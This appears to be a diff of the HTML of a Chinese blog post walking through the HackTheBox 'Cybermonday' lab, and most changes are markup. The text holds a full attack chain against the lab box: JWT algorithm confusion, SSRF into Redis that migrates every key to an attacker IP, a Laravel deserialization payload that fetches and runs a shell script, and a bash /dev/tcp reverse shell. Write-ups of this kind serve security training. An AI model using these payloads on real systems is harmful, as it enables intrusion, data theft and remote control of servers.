@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cybermonday 10.10.11.228                                                                                                              端口扫描22和80: 12345678910111">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cybermonday 10.10.11.228   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.228Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-21 14:00 CSTNm">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cybermonday - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/08/23/Cybermonday-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cybermonday 10.10.11.228                                                                                                              端口扫描22和80: 12345678910111">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Cybermonday 10.10.11.228   端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.228Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-21 14:00 CSTNm">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082101.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082102.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082103.jpg">
@@ -148,8 +148,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -171,7 +178,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -238,14 +245,7 @@
 <li><a href="https://app.hackthebox.com/machines/Cybermonday" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Cybermonday</a></li>
 <li>10.10.11.228</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082101.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082101.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.228</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 14:00 CST</span><br><span class="line">Nmap scan report for 10.10.11.228</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)</span><br><span class="line">|   256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)</span><br><span class="line">|_  256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.25.1</span><br><span class="line">|_http-title: Did not follow redirect to http://cybermonday.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 52.47 seconds</span><br></pre></td></tr></table></figure>
 
@@ -255,148 +255,43 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.228 cybermonday.htb</span><br></pre></td></tr></table></figure>
 
 <p>一个在线商城：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082102.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082102.jpg" alt=""></p>
 <h1 id="cybermonda"><a href="#cybermonda" class="headerlink" title="cybermonda"></a>cybermonda</h1><p>随意注册登录，cookie是base64编码json:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082103.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082103.jpg" alt=""></p>
 <h2 id="debug-mode"><a href="#debug-mode" class="headerlink" title="debug mode"></a>debug mode</h2><p>注册时尝试sql注入，例如使用<code>miao&#39;</code>作为用户名，报错发现开了debug mode：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082104.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082104.jpg" alt=""></p>
 <p>其中可以看到有一个isAdmin属性：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082105.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082105.jpg" alt=""></p>
 <h2 id="isAdmin"><a href="#isAdmin" class="headerlink" title="isAdmin"></a>isAdmin</h2><p>回到正常用户，有一个更新Profile的功能，更新的时候尝试添加isAdmin参数，成功成为管理员,多了一个Dashboard：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082106.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082107.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082106.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082107.jpg" alt=""></p>
 <h2 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h2><p>changelog中发现webhook子域名，同样添加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.228 cybermonday.htb webhooks-api-beta.cybermonday.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082108.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082108.jpg" alt=""></p>
 <h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>这里测试还可以发现一个路径穿越导致LFI,nginx配置的问题，配置文件中使用alias，上下不一致：</p>
 <ul>
 <li>三个案例看Nginx配置安全 | 离别歌<br><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082115.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082115.jpg" alt=""></p>
 <h2 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h2><p>同样存在git泄漏，结合上面的路径穿越：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://cybermonday.htb/assets../.git/config</span><br><span class="line"></span><br><span class="line">git-dumper "http://cybermonday.htb/assets../.git" git_dump</span><br></pre></td></tr></table></figure>
 
 <h1 id="webhook"><a href="#webhook" class="headerlink" title="webhook"></a>webhook</h1><p>访问给出的webhook是404，直接访问根路径给出api信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082109.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082109.jpg" alt=""></p>
 <h2 id="x-access-token"><a href="#x-access-token" class="headerlink" title="x-access-token"></a>x-access-token</h2><p>根据API注册登录，得到x-access-token是JWT,其中role是user：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082110.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082111.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082112.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082110.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082111.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082112.jpg" alt=""></p>
 <h2 id="Webhooks"><a href="#Webhooks" class="headerlink" title="Webhooks"></a>Webhooks</h2><p>使用得到的token查看webhooks,uuid就是dashboard里显示的那个：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082113.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082113.jpg" alt=""></p>
 <p>现有的action是createLogFile，根据API调用，响应成功，但不知道写入位置：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082114.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082114.jpg" alt=""></p>
 <p>当前token因为是user，创建webhook无权限</p>
 <h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>基础的探测可以发现jwks.json:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;webhooks-api-beta.cybermonday.htb&#x2F;jwks.json</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082116.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082116.jpg" alt=""></p>
 <h2 id="Algorithm-confusion"><a href="#Algorithm-confusion" class="headerlink" title="Algorithm confusion"></a>Algorithm confusion</h2><p>现有信息，有jwks，有user的jwt，需要admin的jwt，这种场景：</p>
 <ul>
 <li>Algorithm confusion attacks | Web Security Academy<br><a href="https://portswigger.net/web-security/jwt/algorithm-confusion" target="_blank" rel="noopener">https://portswigger.net/web-security/jwt/algorithm-confusion</a></li>
@@ -406,83 +301,27 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/jwt_tool/jwt_tool.py -t http://webhooks-api-beta.cybermonday.htb/webhooks -rh "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJtaWFvIiwicm9sZSI6InVzZXIifQ.cIue1XS4uxo6dUVE8XLsMlFHrXghXju0mTtKvr9mzAUezYku6z8JAQuWHWsvnNesdqZCbHgKIsegWFe4H-k-PgxewNHWpdB8gy90r0k2J4oS7Ddo0_79SApjKgKOuXF1gYDmpKYu1IK2wmeVF7v6tkhPDsJmEgXWEBnHvmAWCP70PIBtgGUXqI25L7BxLmkPnnItX4lvvRrr7Vcm7x7XFfzvAI_ZdfsBYZaDRC6wqGnFsQtt7zIEXriUgPrQZpIe_nHXWOAqfifSDDyOCWOorxu8WKIJ2pSb0wi9ujMSxmzqMKPccZuGZlasGMneoYSCbEedJZPvOMJHFGfBYwAq_g" -V -jw jwks.json</span><br><span class="line"></span><br><span class="line">Found RSA key factors, generating a public key</span><br><span class="line">[+] kid_0_1692601371.pem</span><br></pre></td></tr></table></figure>
 
 <p>导入Burp扩展后，修改jwt内容，使用Attack-&gt;HMAC key Confusion方式，选择我们导入的pem，签名后发送，现在我们是admin，可以创建新的webhook使用sendRequest action：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082117.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082118.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082117.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082118.jpg" alt=""></p>
 <h1 id="sendRequest"><a href="#sendRequest" class="headerlink" title="sendRequest"></a>sendRequest</h1><p>现在可以调用我们创建的webhook使用sendRequest方法，根据api是url和method两个参数，url必须http协议，method可以任意：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082119.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082120.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082119.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082120.jpg" alt=""></p>
 <h2 id="redis-slaveof"><a href="#redis-slaveof" class="headerlink" title="redis slaveof"></a>redis slaveof</h2><p>已有条件只能SSRF，根据前面LFI中得到的一些信息，尝试使用redis的slaveof：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;redis:6379&quot;,&quot;method&quot;:&quot;slaveof 10.10.16.2 6379\r\n\r\n&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以接收到来自redis的ping请求：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082121.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082121.jpg" alt=""></p>
 <p>修改请求通过主从获取redis中数据(主站那里正常登录触发)：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;redis:6379&quot;,&quot;method&quot;:&quot;EVAL &#39;for k,v in pairs(redis.call(\&quot;KEYS\&quot;, \&quot;*\&quot;)) do redis.pcall(\&quot;MIGRATE\&quot;,\&quot;10.10.16.2\&quot;,\&quot;6379\&quot;,v,0,200) end&#39; 0\r\n*1\r\n$20\r\n&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082122.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082122.jpg" alt=""></p>
 <h1 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h1><p>现在已有条件，可以控制Laravel用到的redis，那就可以尝试修改redis中的数据来打反序列化：</p>
 <p>注意修改payload中对应的长度，以及引号和斜杠的转义:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/Tools/phpggc/phpggc Laravel/RCE10 system 'curl 10.10.16.2:7777'</span><br><span class="line"></span><br><span class="line">&#123;"url": "http://redis:6379","method": "*3\r\n$3\r\nset\r\n$56\r\nlaravel_session:57VLa9wNMwVgQp0NGnBckednmh0LCTS0OFnYlVGT\r\n$238\r\nO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:&#123;s:9:\"condition\";a:2:&#123;i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:&#123;s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:20:\"curl 10.10.16.2:7777\";&#125;i:1;s:4:\"user\";&#125;&#125;\r\n*1\r\n$4\r\nquit\r\n"&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082123.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082123.jpg" alt=""></p>
 <p>发送后回到首页刷新，触发反序列化：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082124.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082124.jpg" alt=""></p>
 <h2 id="cookie-decrypt"><a href="#cookie-decrypt" class="headerlink" title="cookie decrypt"></a>cookie decrypt</h2><p>redis中的key是session id，也可以直接从cookie中解密得到，需要的app_key在前面的env中可以得到：</p>
 <ul>
 <li>Laravel - HackTricks<br><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel#decrypt-cookie" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel#decrypt-cookie</a></li>
@@ -494,32 +333,11 @@
 <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>同样的反序列化方法，得到www-data shell:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/Tools/phpggc/phpggc Laravel/RCE10 system 'curl 10.10.16.2:7777/shell | sh'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line">bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.2/4444 0&gt;&amp;1"</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082125.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082125.jpg" alt=""></p>
 <h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>前面的env中也可以知道<code>CHANGELOG_PATH=&quot;/mnt/changelog.txt&quot;</code>,去查看mnt目录发现user .txt,但当前没有权限读取:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082126.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082126.jpg" alt=""></p>
 <h2 id="docker-Registry"><a href="#docker-Registry" class="headerlink" title="docker Registry"></a>docker Registry</h2><p>容器内很多命令都没有，简单的探测，根据hosts知道网段，registry默认5000端口一个个探测，发现172.18.0.3(不固定，也可能是其他ip):</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082127.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082127.jpg" alt=""></p>
 <p>然后就是转发端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse</span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">curl http://10.10.16.2:7777/chisel_1.7.6_linux_amd64 -o chisel</span><br><span class="line">chmod +x ./chisel</span><br><span class="line">./chisel client 10.10.16.2:9999 R:5000:172.18.0.3:5000</span><br></pre></td></tr></table></figure>
 
@@ -530,42 +348,14 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 DockerGraber.py http://127.0.0.1 --list</span><br><span class="line">[+] cybermonday_api</span><br><span class="line"></span><br><span class="line">python3 DockerGraber.py http://127.0.0.1 --dump cybermonday_api</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082128.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082128.jpg" alt=""></p>
 <h2 id="LogsController"><a href="#LogsController" class="headerlink" title="LogsController"></a>LogsController</h2><p>dump得到的文件中读代码，LogsController中发现list和read的action，需要用的api key在heapers/apis.php里：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;api_key = <span class="string">"22892e36-1770-11ee-be56-0242ac120002"</span>;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082129.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082129.jpg" alt=""></p>
 <p>list只能看action是createLogFile的webhook的日志目录，read也有很多过滤：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082130.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082131.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082130.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082131.jpg" alt=""></p>
 <h2 id="Logs-LFI"><a href="#Logs-LFI" class="headerlink" title="Logs LFI"></a>Logs LFI</h2><p>根据前面的代码，过滤规则是：</p>
 <ul>
 <li>不允许出现 <code>../</code></li>
@@ -573,54 +363,19 @@
 <li>文件名中中必须包含<code>log</code></li>
 </ul>
 <p>那如果是<code>. ./</code>,这样的，能够通过第一层校验，然后空格被去掉变成了正常的<code>../</code>:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082132.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082132.jpg" alt=""></p>
 <p>读取环境变量信息，得到一个密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DBPASS&#x3D;ngFfX2L71Nu</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082133.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082133.jpg" alt=""></p>
 <p>另外容器内读文件可以知道用户名是john:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082134.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082134.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的用户名密码登录:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh john@10.10.11.228</span><br><span class="line">ngFfX2L71Nu</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082135.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082135.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo可以运行一个py调用docker-compose：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023082136.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
